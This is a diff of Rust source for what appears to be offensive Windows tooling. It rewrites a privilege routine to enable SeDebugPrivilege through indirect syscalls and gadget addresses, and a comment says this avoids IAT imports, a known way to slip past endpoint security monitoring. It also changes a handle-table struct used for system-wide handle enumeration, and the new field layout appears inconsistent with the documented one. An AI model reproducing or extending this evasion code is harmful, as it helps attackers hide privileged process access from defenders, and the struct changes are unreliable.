@@ -394,11 +394,11 @@ type void = std::ffi::c_void;
 struct SystemHandleTableEntryInfo {
     unique_process_id: u16,
     creator_back_trace_index: u16,
-    object_type_index: u8,
-    handle_attributes: u8,
-    granted_access: u16,
+    object_type_index: u16,
+    handle_attributes: u16,
     handle_value: u16,
-    object: *mut void,
+    object: usize,
+    granted_access: u32,
 }
 
 /// SYSTEM_HANDLE_INFORMATION for NtQuerySystemInformation(SystemHandleInformation).
@@ -699,36 +699,41 @@ fn prepare_privileges() -> Result<PrivilegeContext> {
 
 /// Enable SeDebugPrivilege on the current process token.
 /// Returns Ok(true) if it was already enabled, Ok(false) if we enabled it.
+///
+/// Uses indirect syscalls (NtOpenProcessToken, NtAdjustPrivilegesToken) and
+/// the static SeDebugPrivilege LUID instead of IAT imports.
 fn enable_debug_privilege() -> Result<bool> {
-    use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
-    use winapi::um::winnt::{TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, LUID, TOKEN_PRIVILEGES};
-    use winapi::um::securitybaseapi::{GetTokenInformation, AdjustTokenPrivileges};
+    use winapi::um::winnt::{TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, TOKEN_PRIVILEGES};
     use winapi::um::winnt::TokenPrivileges;
-    use winapi::shared::ntdef::{NTSTATUS};
+    use winapi::um::securitybaseapi::GetTokenInformation;
 
-    // Look up the LUID for SeDebugPrivilege.
-    let privilege_name: Vec<u16> = "SeDebugPrivilege\0".encode_utf16().collect();
-    let mut luid: LUID = unsafe { std::mem::zeroed() };
-    let ok = unsafe {
-        winapi::um::securitybaseapi::LookupPrivilegeValueW(
-            ptr::null_mut(),
-            privilege_name.as_ptr(),
-            &mut luid,
-        )
-    };
-    if ok == 0 {
-        return Err(anyhow!("LookupPrivilegeValue for SeDebugPrivilege failed"));
-    }
+    // SeDebugPrivilege LUID is always { LowPart: 20, HighPart: 0 } on all
+    // Windows versions.  Using the static value avoids calling LookupPrivilegeValueW.
+    let debug_luid = winapi::um::winnt::LUID { LowPart: 20, HighPart: 0 };
 
+    // ── NtOpenProcessToken via indirect syscall ──
+    let current_process: HANDLE = (-1isize) as HANDLE; // GetCurrentProcess pseudo-handle
     let mut token: HANDLE = ptr::null_mut();
-    let ok = unsafe {
-        OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token)
-    };
-    if ok == 0 {
-        return Err(anyhow!("OpenProcessToken failed"));
+    {
+        let target = nt_syscall::get_syscall_id("NtOpenProcessToken")
+            .map_err(|e| anyhow!("NtOpenProcessToken SSN resolution: {e}"))?;
+        let status = unsafe {
+            nt_syscall::do_syscall(
+                target.ssn,
+                target.gadget_addr,
+                &[
+                    current_process as u64,
+                    (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY) as u64,
+                    &mut token as *mut _ as u64,
+                ],
+            )
+        };
+        if !nt_success(status) {
+            return Err(anyhow!("NtOpenProcessToken failed: 0x{status:08X}"));
+        }
     }
 
-    // Check if already enabled.
+    // Check if already enabled via GetTokenInformation (query-only, no privilege change).
     let mut return_length: u32 = 0;
     unsafe {
         GetTokenInformation(
@@ -760,8 +765,8 @@ fn enable_debug_privilege() -> Result<bool> {
                 )
             };
             entries.iter().any(|p| {
-                p.Luid.LowPart == luid.LowPart
-                    && p.Luid.HighPart == luid.HighPart
+                p.Luid.LowPart == debug_luid.LowPart
+                    && p.Luid.HighPart == debug_luid.HighPart
                     && (p.Attributes & 2) != 0 // SE_PRIVILEGE_ENABLED
             })
         } else {
@@ -772,24 +777,39 @@ fn enable_debug_privilege() -> Result<bool> {
     };
 
     if was_enabled {
-        unsafe { winapi::um::handleapi::CloseHandle(token) };
+        nt_close(token);
         return Ok(true);
     }
 
-    // Enable the privilege.
+    // ── NtAdjustPrivilegesToken via indirect syscall ──
     let mut tp: TOKEN_PRIVILEGES = unsafe { std::mem::zeroed() };
     tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Luid = debug_luid;
     tp.Privileges[0].Attributes = 2; // SE_PRIVILEGE_ENABLED
 
-    let ok = unsafe { AdjustTokenPrivileges(token, 0, &mut tp, 0, ptr::null_mut(), ptr::null_mut()) };
-    let last_err = unsafe { winapi::um::errhandlingapi::GetLastError() };
-    unsafe { winapi::um::handleapi::CloseHandle(token) };
-
-    if ok == 0 || last_err != 0 {
-        Err(anyhow!("AdjustTokenPrivileges failed: error {last_err}"))
-    } else {
-        Ok(false)
+    {
+        let target = nt_syscall::get_syscall_id("NtAdjustPrivilegesToken")
+            .map_err(|e| anyhow!("NtAdjustPrivilegesToken SSN resolution: {e}"))?;
+        let status = unsafe {
+            nt_syscall::do_syscall(
+                target.ssn,
+                target.gadget_addr,
+                &[
+                    token as u64,
+                    0u64,                                          // DisableAllPrivileges = FALSE
+                    &mut tp as *mut _ as u64,                      // NewState
+                    0u64,                                          // BufferLength
+                    ptr::null_mut::<u64>() as u64,                 // PreviousState
+                    ptr::null_mut::<u32>() as u64,                 // ReturnLength
+                ],
+            )
+        };
+        nt_close(token);
+        if !nt_success(status) {
+            Err(anyhow!("NtAdjustPrivilegesToken failed: 0x{status:08X}"))
+        } else {
+            Ok(false)
+        }
     }
 }
 
